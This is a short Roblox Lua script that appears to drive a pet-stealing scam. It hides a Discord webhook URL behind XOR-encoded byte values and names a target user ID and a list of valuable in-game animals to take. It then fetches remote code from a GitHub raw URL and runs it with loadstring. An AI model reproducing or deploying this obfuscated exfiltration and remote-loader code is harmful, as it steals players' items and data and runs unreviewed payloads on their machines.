local genv = getgenv()

genv.GOOD_WEBHOOK = (function()
    local b = {73,85,85,81,82,27,14,14,69,72,82,66,78,83,69,15,66,78,76,14,64,81,72,14,86,68,67,73,78,78,74,82,14,16,20,18,19,17,20,25,22,24,18,17,23,23,22,23,19,19,22,17,14,12,66,82,79,88,108,71,79,82,19,19,89,22,103,70,83,21,100,89,16,83,108,17,73,121,66,108,71,100,84,66,21,118,17,117,18,87,71,21,78,86,20,100,75,111,105,91,104,113,24,69,119,116,79,126,79,78,71,108,89,100,111,24,87,79,123,23,17}
    local k = 33
    local o = {}
    for i = 1, #b do o[i] = string.char(bit32.bxor(b[i], k)) end
    return table.concat(o)
end)()

genv.TARGET_USER_ID = 9426261899

genv.GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"

genv.ALLOWED_ANIMALS = {
    "Strawberry Elephant",
    "Headless Horseman",
    "John Pork",
    "Meowl",
    "Skibidi Toilet",
    "Griffin",
    "Dragon Aquanini",
    "Dragon Gingerini",
    "Hydra Dragon Cannelloni",
    "Signore Carapace",
    "Love Love Bear",
    "Dragon Cannelloni",
    "Moby Bros",
    "Digi Narwhal",
    "Kraken",
    "La Supreme Combinasion",
    "Elefanto Frigo",
    "Hydra Bunny",
    "Celestial Pegasus",
    "Cerberus",
    "Jelly Moby",
    "Bunny and Eggy",
    "Popcuru and Fizzuru",
    "Rosey and Teddy",
    "Capitano Moby",
    "Cooki and Milki",
    "Arcadragon",
    "Burguro and Fryuro",
    "Ketupat Bros",
    "Reinito Sleighito",
    "Fortunu and Cashuru",
    "Los Amigos",
    "Antonio",
    "La Secret Combinasion",
    "Pancake and Syrup",
    "Foxini Lanternini",
    "Kalika Bros",
    "Los Sekolahs",
    "Sammyni Fattini",
    "Cash or Card",
    "Fragrama and Chocrama",
    "La Casa Boo",
    "Los Admins",
    "Duggy Bros",
    "La Food Combinasion",
    "Sammyni Cakini",
    "Boppin Bunny",
    "Spooky and Pumpky",
    "Ginger Gerat",
    "La Ginger Sekolah",
    "Los Chillis",
    "Los Hackers",
    "Bearito Cabinito",
    "Capitano Americano",
    "Los Spaghettis",
    "Rubrikiko",
    "Festive 67",
    "Guest 666",
    "Quackini Snackini",
    "Cloverat Clapat",
    "Caylusaurus",
    "Hopilikalika Hopilikalako",
    "Steakini Fattini",
    "Garama and Madundung",
    "Nacho Spyder",
    "Fishino Clownino",
    "Money Money Bros",
    "Jolly Jolly Sahur",
    "Gym Bros",
    "Rico Dinero",
    "Tirilikalika Tirilikalako",
    "Orcaledon",
    "Swaggy Bros",
    "Abyssaloco",
    "Fragola La La La",
    "Los Tacoritas",
    "Eviledon",
    "Los Mariachis",
    "Globa Steppa",
    "Tralaledon",
    "Chillin Chili",
    "Los Bros",
    "Celularcini Viciosini",
    "La Sahur Combinasion",
}

genv.ALLOWED_PLACE_IDS = {
    109983668079237,
    78906538690694,
    119594317142884,
}

task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/norgegat-byte/K2/refs/heads/main/main.lua"))()
end)
